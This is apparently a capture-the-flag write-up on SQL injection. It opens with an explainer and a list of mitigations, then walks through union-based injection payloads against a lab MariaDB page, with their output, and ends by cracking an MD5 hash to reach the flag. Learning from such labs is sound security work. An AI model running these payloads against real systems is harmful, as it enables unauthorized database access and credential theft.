# SQL Injection

SQL Injection (SQLi) is a type of injection attack where malicious SQL code is inserted into input fields, query strings, or HTTP headers with the intention of manipulating the application's interaction with its database.

If successful, an attacker can:

- **Read sensitive data** (e.g., user credentials, personal information)
- **Modify or delete data** (Insert, Update, Delete)
- **Perform administrative operations** on the database (e.g., shutdown, drop tables)
- **Access system files** stored on the database server
- **Execute OS-level commands** (in some configurations)

SQL Injection occurs when input is not properly validated or sanitized, allowing attacker-supplied input to be executed as part of a SQL query.

## Mitigations
To protect your application from SQL Injection:
- Use parameterized queries (also known as prepared statements) with bound parameters.
- Avoid dynamic SQL construction using user input.
- Use ORM (Object-Relational Mapping) frameworks which safely abstract SQL queries (when used correctly).
- Escape and sanitize input data if query construction is unavoidable (e.g., LIKE clauses with wildcards).
- Enforce least privilege on database users — avoid using accounts with admin rights.
- Validate input data strictly (e.g., length, type, format, and range).
- Use stored procedures that do not concatenate user input into queries.
- Monitor and log all database errors and query behavior for suspicious activity.
- Disable detailed SQL errors in production to prevent leakage of database structure or logic.

## References
- [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)

## Exercise
In the input field, we run some commands.

1. Try different combinations to case error, to check if this field is vulnerable against SQL Injection,
```
'1 # -> 1 -- -> 1 = 1 
```
and etc.
A syntax error from MariaDB has been alerted. So, we know that we are dealing with MariaDB server now.

2. Identify the amount of columns in the statement
```
1 ORDER BY 1 # 
1 ORDER BY 2 #
1 ORDER BY 3 #
```
Number 3 caused an error, it means there are 2 columns being selected.

3. Identify existing tables in the DB with union select
```
1 UNION SELECT table_name, NULL FROM information_schema.tables #
```

Results: 
```
ID: 1 UNION SELECT table_name, NULL FROM information_schema.tables  
First name: db_default
Surname : 

ID: 1 UNION SELECT table_name, NULL FROM information_schema.tables # 
First name: users
Surname : 

ID: 1 UNION SELECT table_name, NULL FROM information_schema.tables # 
First name: guestbook
Surname : 

ID: 1 UNION SELECT table_name, NULL FROM information_schema.tables # 
First name: list_images
Surname : 

ID: 1 UNION SELECT table_name, NULL FROM information_schema.tables # 
First name: vote_dbs
Surname : 
```

4. Target table users to inject vulnerable data
```
1 UNION SELECT password, NULL FROM users # 
```
This did not work.

5. We tried different way, get exisiting columns first.
```
1 UNION SELECT column_name, NULL FROM information_schema.columns
```

Result:
```
ID: 1 UNION SELECT column_name, NULL FROM information_schema.columns 
First name: username
Surname : 

ID: 1 UNION SELECT column_name, NULL FROM information_schema.columns 
First name: password
Surname : 

ID: 1 UNION SELECT column_name, NULL FROM information_schema.columns 
First name: user_id
Surname : 

ID: 1 UNION SELECT column_name, NULL FROM information_schema.columns 
First name: first_name
Surname : 

ID: 1 UNION SELECT column_name, NULL FROM information_schema.columns 
First name: last_name
Surname : 

ID: 1 UNION SELECT column_name, NULL FROM information_schema.columns 
First name: town
Surname : 

ID: 1 UNION SELECT column_name, NULL FROM information_schema.columns 
First name: country
Surname : 

ID: 1 UNION SELECT column_name, NULL FROM information_schema.columns 
First name: planet
Surname : 

ID: 1 UNION SELECT column_name, NULL FROM information_schema.columns 
First name: Commentaire
Surname : 

ID: 1 UNION SELECT column_name, NULL FROM information_schema.columns 
First name: countersign
Surname : 

ID: 1 UNION SELECT column_name, NULL FROM information_schema.columns 
First name: id_comment
Surname : 

ID: 1 UNION SELECT column_name, NULL FROM information_schema.columns 
First name: url
Surname : 

ID: 1 UNION SELECT column_name, NULL FROM information_schema.columns 
First name: title
Surname : 

ID: 1 UNION SELECT column_name, NULL FROM information_schema.columns 
First name: id_vote
Surname : 

ID: 1 UNION SELECT column_name, NULL FROM information_schema.columns 
First name: vote
Surname : 

ID: 1 UNION SELECT column_name, NULL FROM information_schema.columns 
First name: nb_vote
Surname : 

ID: 1 UNION SELECT column_name, NULL FROM information_schema.columns 
First name: subject
Surname : 
```

6. Select with column names from the list:
```
ID: 1 UNION SELECT user_id, first_name FROM users # 
First name: one
Surname : me

ID: 1 UNION SELECT user_id, first_name FROM users # 
First name: 1
Surname : one

ID: 1 UNION SELECT user_id, first_name FROM users # 
First name: 2
Surname : two

ID: 1 UNION SELECT user_id, first_name FROM users # 
First name: 3
Surname : three

ID: 1 UNION SELECT user_id, first_name FROM users # 
First name: 5
Surname : Flag
```

A surname "Flag" is seen, we tried to inspect the id = 5,
```
ID: 1 UNION SELECT last_name, town FROM users WHERE user_id = 5# 
First name: GetThe
Surname : 42
```
etc...
```
On: 1 UNION SELECT Commentaire,  countersign FROM users WHERE user_id = 5#

ID: 1 UNION SELECT Commentaire,  countersign FROM users WHERE user_id = 5# 
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : 5ff9d0165b4f92b14994e5c685cdce28
```

7. Some hashed value has been identified, with the hint instruction "Decrypt this password -> then lower all the char. Sh256 on it and it's good"
we decode from md5, lowercase it and then encode with sha256.
5ff9d0165b4f92b14994e5c685cdce28 (md5) -> FortyTwo -> fortytwo (sha256)
```
sha256 -s fortytwo
```
